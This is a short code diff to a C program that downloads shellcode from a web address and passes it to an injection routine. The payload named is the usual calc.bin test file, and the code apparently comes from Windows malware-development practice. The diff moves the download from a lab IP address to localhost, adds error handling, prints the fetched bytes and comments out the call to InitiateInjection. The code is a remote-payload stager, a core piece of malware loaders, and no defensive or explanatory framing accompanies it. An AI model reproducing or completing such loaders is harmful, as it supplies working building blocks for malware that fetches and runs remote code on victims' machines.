@@ -9,10 +9,13 @@ int main()
 
 	unsigned char* pPayload = NULL;
 	
-	PSTR url = "http://192.168.231.130/calc.bin";
+	PSTR url = "https://127.0.0.1";
+	PSTR endpoint = "/calc.bin";
 	
-	SIZE_T sSize = Download(&pPayload, url);
+	SIZE_T sSize = Download(&pPayload, url, endpoint);
 
+	if (sSize == -1)
+		goto _Cleanup;
 	//Printing shellcode
 	printf("[*] Shellcode: \n");
 	for (SIZE_T i = 0; i < sSize; i++)
@@ -21,9 +24,13 @@ int main()
 	}
 	printf("\n");
 
-	if (InitiateInjection(pPayload,sSize))
+	getchar();
+	/*if (InitiateInjection(pPayload,sSize))
 	{
 		return -1;
-	}
+	}*/
+
+_Cleanup:
 	return 0;
+
 }
